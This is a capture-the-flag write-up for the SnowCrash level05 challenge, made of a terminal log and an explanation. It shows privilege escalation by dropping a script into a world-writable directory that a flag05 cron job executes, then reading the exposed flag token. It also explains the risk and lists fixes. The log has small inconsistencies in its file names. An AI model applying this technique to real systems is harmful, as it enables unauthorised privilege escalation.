```shell
level05@SnowCrash:/var/tmp$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/var/tmp$ cd /usr/sbin
level05@SnowCrash:/usr/sbin$ cat openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:/usr/sbin$ cd /opt/openarenaserver/
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ ls -la
total 0
drwxrwxr-x+ 2 root root 40 Mar 31 18:40 .
drwxr-xr-x  1 root root 60 Mar 31 09:43 ..
level05@SnowCrash:/opt/openarenaserver$ vim script.sh && chmod +x script.shlevel05@SnowCrash:/opt/openarenaserver$ cat script.sh && ls -la
#!/bin/bash
echo `getflag` > /tmp/flag05
total 4
drwxrwxr-x+ 2 root    root    60 Mar 31 18:51 .
drwxr-xr-x  1 root    root    60 Mar 31 09:43 ..
-rwxrwxr-x+ 1 level05 level05 59 Mar 31 18:51 script.sh
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag05.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

# SnowCrash - Level 06 (flag05)

## Vulnerability Name

**Cron Job Privilege Escalation via World-Writable Directory**

---

## Discovery Process

1. Found a cron job in `/var/mail/level05`:
```
   */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

2. Inspected `/usr/sbin/openarenaserver`:
```sh
   #!/bin/sh
   for i in /opt/openarenaserver/* ; do
       (ulimit -t 5; bash -x "$i")
       rm -f "$i"
   done
```
   The script loops over every file in `/opt/openarenaserver/`, executes it as a shell script under the `flag05` user, then deletes it.

3. Checked permissions on `/opt/openarenaserver/` — the directory is **world-writable**, meaning any user can drop files into it.

4. Created a malicious script as `level05` and placed it in `/opt/openarenaserver/`:
```bash
   #!/bin/bash
   echo `getflag` > /tmp/flag05
```

5. Waited for the cron job to fire (every 2 minutes). The script was executed as `flag05`, which has the privileges to run `getflag`.

6. Retrieved the flag:
```bash
   cat /tmp/flag05
```
   Note: `/tmp` did not allow directory listing (`ls` returned Permission denied), but knowing the exact filename was sufficient to read the file. Unix permissions are granular — no `x` on a directory blocks listing, not reading a known path.

---

## Why It Is Dangerous

- A privileged cron job executes files from a directory writable by unprivileged users, enabling full privilege escalation with no exploit required.
- An attacker can run arbitrary code as the user owning the cron job.
- Depending on the privileges of that user, this can lead to reading private tokens, adding SSH keys, creating SUID binaries, or full system compromise if the cron runs as root.
- The granular nature of Unix permissions means that a restricted directory (no listing) does not prevent file access if the attacker controls the filename.

---

## How To Fix It

- Never allow a privileged cron job to execute files from a world-writable directory.
- Set strict permissions on directories used by cron jobs: owned by `root`, with mode `700`.
- Use absolute paths in cron scripts and validate or whitelist any scripts before execution.
- Apply the Principle of Least Privilege: cron jobs should run with the minimum required permissions.
- Regularly audit all cron jobs and the directories or scripts they reference.
